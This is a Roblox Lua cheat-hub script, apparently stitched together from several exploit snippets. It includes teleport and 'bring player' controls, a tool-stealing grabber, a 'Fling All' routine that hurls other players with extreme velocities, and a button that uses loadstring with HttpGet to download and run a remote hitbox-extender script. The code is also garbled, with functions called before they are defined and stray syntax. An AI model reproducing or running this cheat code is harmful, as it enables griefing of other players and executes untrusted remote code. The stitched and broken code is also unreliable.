-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerList.Font = Enum.Font.Code
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            PlayerList.Text = "‚ö† Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "‚ö† WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP [3KTG]", function()
	-- TAONG GOMA - Player Viewer (LocalScript sa StarterGui)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TaongGomaGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleBar.Text = "TAONG GOMA"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Gotham
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.Font = Enum.Font.Gotham
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

addMainMenuButton("TPUNANCHORED TO PLAYER [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "UnanchoredToolTP"
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "TAONG GOMA UNANCHORED TP"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
UsernameBox.TextColor3 = Color3.new(1, 1, 1)
UsernameBox.Font = Enum.Font.Gotham
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(1, 1, 1)
FilterLabel.Font = Enum.Font.Gotham
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(1, 1, 1)
FilterDropdown.Font = Enum.Font.Gotham
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(1, 1, 1)
TPButton.Font = Enum.Font.GothamBold
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(1, 1, 1)
GrabButton.Font = Enum.Font.GothamBold
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL [3KTG]", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["ROLEPLAY MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE SYSTEM VIEWER [3KTG]", function()
    -- LocalScript: StorageSystem Tools Viewer (All Black + Copyable Tools + Hide with O)
-- Place in StarterPlayerScripts or StarterGui

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find StorageSystem
local storageSystem = ReplicatedStorage:FindFirstChild("StorageSystem")
if not storageSystem then
    warn("‚ùå 'StorageSystem' not found in ReplicatedStorage.")
    return
end

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "StorageSystemToolsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 340)
frame.Position = UDim2.new(0.5, -200, 0.25, 0)
frame.Active = true
frame.Draggable = true
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.AnchorPoint = Vector2.new(0.5, 0)

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- subtle shadow frame
local shadow = Instance.new("Frame", frame)
shadow.Size = UDim2.new(1, 0, 1, 0)
shadow.Position = UDim2.new(0, 4, 0, 4)
shadow.BackgroundColor3 = Color3.fromRGB(10,10,10)
shadow.ZIndex = -1
shadow.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("Frame", frame)
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
local titleCorner = Instance.new("UICorner", titleBar)
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Name = "TitleCorner"

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "StorageSystem Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(255, 255, 255)

local info = Instance.new("TextLabel", frame)
info.Size = UDim2.new(1, -10, 0, 20)
info.Position = UDim2.new(0, 5, 0, 40)
info.BackgroundTransparency = 1
info.Text = "   Click a tool to copy its name  |  Press [O] to hide/show"
info.Font = Enum.Font.Gotham
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left

local scrolling = Instance.new("ScrollingFrame", frame)
scrolling.Size = UDim2.new(1, -20, 1, -70)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)

local layout = Instance.new("UIListLayout", scrolling)
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder

--// Helper Functions
local function clearList()
    for _, child in ipairs(scrolling:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
end

local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    elseif writeclipboard then
